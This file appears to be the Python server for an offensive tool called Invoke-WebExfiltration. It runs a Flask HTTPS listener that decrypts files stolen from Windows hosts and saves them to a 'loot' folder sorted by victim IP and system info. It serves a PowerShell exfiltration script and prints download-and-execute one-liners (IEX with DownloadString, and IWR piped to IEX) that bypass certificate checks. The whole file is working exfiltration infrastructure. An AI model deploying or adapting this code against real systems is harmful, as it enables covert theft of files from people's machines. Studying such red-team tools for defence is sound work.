#!/usr/bin/python3

import gzip
import random
import string
import signal
import sys
import argparse
import socket
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from flask import Flask, request, Response
import ssl
from OpenSSL import crypto
import os
import shutil
import binascii
from datetime import datetime

author = "Philipp Rieth"
version = "0.2"
DEFAULT_PORT = 8000
DEFAULT_TARGETDIR = f"{os.getcwd()}/loot/"
DEFAULT_CERT_TMP_DIR = f'{os.getcwd()}/tmp_certificate'
DEFAULT_CERTIFICATE_CRT = f'{DEFAULT_CERT_TMP_DIR}/cert.crt'
DEFAULT_CERTIFICATE_KEY = f'{DEFAULT_CERT_TMP_DIR}/cert.key'


def signal_handler(sig, frame):
    """
    Signal handler for program termination
    """
    print('\n\nCtrl+C detected, exiting...')
    if os.path.isdir(DEFAULT_CERT_TMP_DIR):
        print("Cleaning up temp certificates...")
        shutil.rmtree(DEFAULT_CERT_TMP_DIR)
    print("Exit")
    sys.exit(0)


def parse_args():
    """ all arguments needed by the application """
    parser = argparse.ArgumentParser(description='Exfiltrate files to a remote server in a secure, encrypted way',
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-a', "--address",
                        required=False,
                        type=str,
                        help='The domain, hostname or IP address that will be embedded into the PowerShell script.\n'
                             'Default: local IP address')

    parser.add_argument('-p', "--port",
                        required=False,
                        type=str,
                        help=f'Listening port that will be used.\n'
                             f'Default: {DEFAULT_PORT}')

    parser.add_argument('-P', '--password',
                        required=False,
                        type=str,
                        help='Password to use for decryption.\n'
                             'Default: generate random password')

    parser.add_argument('-t', '--targetdir',
                        required=False,
                        type=str,
                        help=f"Loot directory to store the exfiltrated files in.\n"
                             f"Default: '{DEFAULT_TARGETDIR}'")

    parser.add_argument('--crt',
                        required=False,
                        type=str,
                        help=f"Path to custom certificate (.crt)")

    parser.add_argument('--key',
                        required=False,
                        type=str,
                        help=f"Path to custom certificate private key (.key)")

    parser.add_argument('--http',
                        required=False,
                        action='store_true',
                        default=False,
                        help='Use HTTP instead of HTTPS.\n'
                             'Default: HTTPS')

    parser.add_argument('--verbose',
                        required=False,
                        action='store_true',
                        default=False,
                        help='Print verbose information on console.\nDefault: False')

    return parser


def validate_args(parser):
    """
    Checking for valid arguments
    """
    args = parser.parse_args()

    if not args.password:
        args.password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    if not args.port:
        args.port = DEFAULT_PORT

    if not args.address:
        args.address = socket.gethostbyname(socket.gethostname())
        if '127.' in args.address:
            print("Error: Could not get interface IP address. Specify domain or IP manually with '--address'")

    if not args.targetdir:
        args.targetdir = DEFAULT_TARGETDIR

    # stupid XOR
    if (not args.crt and args.key) or (args.crt and not args.key):
        print("Error: You need to specify both, '--crt' and '--key'")
        exit(1)
    elif args.crt and args.key:
        if not os.path.isfile(args.crt):
            print(f"Error: '{args.crt} does not exist'")
            exit(1)

        if not os.path.isdir(args.key):
            print(f"Error: '{args.crt} does not exist'")
            exit(1)

    return args


class CouldNotDecryptError(Exception):
    pass


class IWE:
    def __init__(self, password: str):
        """
        Init function for IWE
        :param password: password used for file decryption
        """

        self.__password = password
        # SHA256 hash the plain text password
        self.password_sha256 = hashlib.sha256(password.encode()).digest()
        iwe_filename = 'Invoke-WebExfiltration.ps1'

        # Invoke-WebExfiltration need to be in the current working dir
        # This messy command makes sure to always load Invoke-WebExfiltration.ps1 from the directory where
        # the iwe-server.py is located in. This is independent to the current PWD
        __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
        try:
            with open(os.path.join(__location__, iwe_filename)) as f:
                self.powershell_iwe_script = f.read()
        except FileNotFoundError:
            print(f"Error: Could not open '{iwe_filename}'. File not found")
            exit(1)

    def __aes256_decrypt_bytes(self, aes256_cipher_bytes: bytes) -> bytes:
        """
        Decryption function. Will decrypt cipher byte object with password class variable

        The first 16 bytes of the AES hex is the AES IV.
        The password is SHA256 hashed to get a 32 byte long password

        :param aes256_cipher_bytes: the encrypted bytes
        :return: returns the decrypted bytes
        """
        # extract the AES IV from the cipher text
        aes_iv = aes256_cipher_bytes[:16]
        aes_cipher_text = aes256_cipher_bytes[16:]

        try:
            cipher = AES.new(self.password_sha256, AES.MODE_CBC, aes_iv)
            plain_text = unpad(cipher.decrypt(aes_cipher_text), AES.block_size)

        except (ValueError, KeyError):
            print("[X] Error: Incorrect decryption. Wrong password? Continuing...")
            raise CouldNotDecryptError

        return plain_text

    def aes256_decrypt_b64_string(self, aes_b64_filename: str) -> str:
        """
        Takes an AES256 encrypted base64 string and converts it back to the original file name

        The base64 string is packed the following way:
        Decode base64 > AES Hex bytes

        :param aes_b64_filename: the base64 file name to decrypt
        :return: returns the file name as a string
        """
        # decode the base64 string
        try:
            b64_decoded = base64.b64decode(aes_b64_filename)
        except binascii.Error:
            print("Error: could not decode base64! Something is wrong...")
            return ""

        return self.__aes256_decrypt_bytes(b64_decoded).decode('utf-8')

    def aes256_decrypt_binary(self, aes_b64_enc: str) -> bytes:
        """
        Takes an encrypted, gzipped base64 string and converts it into a byte array.

        The base64 string is packed the following way:
        Decode base64 > decompress gzip > AES Hex bytes

        :param aes_b64_enc: base64 string to decrypt
        :return: returns a byte object ob the decrypted file
        """

        # decode the base64 string
        b64_decoded = base64.b64decode(aes_b64_enc)
        # decompress gzip bytes
        gzip_decoded = gzip.decompress(b64_decoded)

        return self.__aes256_decrypt_bytes(gzip_decoded)


def cert_gen():
    """
    Generates a self singed x509 certificate for HTTPS
    openssl req -newkey rsa:4096 -x509 -sha256 -days 3650 -nodes  -out certificate.crt -keyout certificate.key
    :return:
    """
    # create a key pair
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 2048)
    # create a self-signed cert
    cert = crypto.X509()
    cert.get_subject().C = "AU"  # countryName
    cert.get_subject().ST = "-"  # stateOrProvinceName
    cert.get_subject().L = "-"  # localityName
    cert.get_subject().O = "-"  # organizationName
    cert.get_subject().OU = "-"  # organizationUnitName
    cert.get_subject().CN = "IWE"  # commonName
    cert.get_subject().emailAddress = "-"  # emailAddress
    cert.set_serial_number(0)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(365*24*60*60)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha512')
    if not os.path.isdir(DEFAULT_CERT_TMP_DIR):
        os.makedirs(DEFAULT_CERT_TMP_DIR)

    with open(DEFAULT_CERTIFICATE_CRT, "wt") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
    with open(DEFAULT_CERTIFICATE_KEY, "wt") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))

    # create in-memory file objects of the generated certificates
    # crt = io.StringIO(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
    # key = io.StringIO(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
    # crt = crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8")
    # key = crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8")


def main():
    art = """
 _____  ____      ____  ________  
|_   _||_  _|    |_  _||_   __  | 
  | |    \ \  /\  / /    | |_ \_| 
  | |     \ \/  \/ /     |  _| _  
 _| |_     \  /\  /     _| |__/ | 
|_____|     \/  \/     |________| 
    """

    # catch CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    print(f"{art}\nInvoke-WebExfiltration v{version} \nby {author}\n")
    # Get the args
    parser = parse_args()
    args = validate_args(parser)

    proto = "https" if not args.http else 'http'
    target_url = f'{proto}://{args.address}:{args.port}/'
    target_url_post_req = f'{target_url}sendfile'

    print(f"URL:      {target_url}\n" 
          f"Password: {args.password}\n"
          f"Loot dir: {args.targetdir}\n")
    print("Load into PowerShell via NetWebClient:\n"
          "PS > [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
          f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n\n"
          "Load into PowerShell via Invoke-WebRequest:\n"
          f"PS > IWR -SkipCertificateCheck '{target_url}iwe' | IEX \n")
    print("Start exfiltrating files with:\n"
          "PS > ls * | IEX\n")

    app = Flask(__name__)
    iwe = IWE(password=args.password)

    @app.route('/sendfile', methods=['POST'])
    def sendfile():

        try:
            content = request.get_json()
        except Exception as e:
            raise e

        try:
            file_full_path = iwe.aes256_decrypt_b64_string(content['fn'])
            system_info = iwe.aes256_decrypt_b64_string(content['si'])
            plaintext_bytes = iwe.aes256_decrypt_binary(content['ct'])
        except CouldNotDecryptError:
            return Response('Error: Received encrypted file but could not decrypt it. Wrong password?', status=200)
        except TypeError:
            return Response('Error: The received JSON body looks wrong', status=200)

        dirs = os.path.dirname(file_full_path).replace(':', '')
        filename = os.path.basename(file_full_path)

        system_ident = ''.join(char for char in system_info if char not in ';:/\\*?><|')
        system_ident = system_ident.replace(' ', '_')
        client_ip = request.remote_addr

        client_folder_name = f"{client_ip}_{system_ident}"

        os.makedirs(os.path.join(args.targetdir, client_folder_name, dirs), exist_ok=True)
        with open(os.path.join(args.targetdir, client_folder_name, dirs, filename), "wb") as f:
            f.write(plaintext_bytes)

        return Response('Thanks!', status=200)

    @app.route('/')
    @app.errorhandler(404)
    @app.errorhandler(405)
    def dont_know(a=1):
        """ Junk return for fun """
        return Response("¯\_(ツ)_/¯", status=200)

    @app.route('/iwe', methods=['GET'])
    def get_iwe_ps1():
        """
        Reads the current Invoke-WebExfiltration.ps1 file and returns it on request
        """

        with open('Invoke-WebExfiltration.ps1', encoding="utf-8") as f:
            iwe_file = f.read()

        iwe_file = iwe_file.replace('TARGET_PLACEHOLDER', target_url_post_req)

        return Response(iwe_file, status=200)

    # Run iwe in HTTP mode
    if args.http:
        app.run(host='0.0.0.0', port=args.port)

    # run iwe in HTTPS mode
    else:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        # use user supplied certificate
        if args.crt and args.key:
            context.load_cert_chain(certfile=args.crt, keyfile=args.key)
        else:
            cert_gen()
            context.load_cert_chain(certfile=DEFAULT_CERTIFICATE_CRT, keyfile=DEFAULT_CERTIFICATE_KEY)

        app.run(host='0.0.0.0', port=args.port, ssl_context=context)


if __name__ == "__main__":
    main()
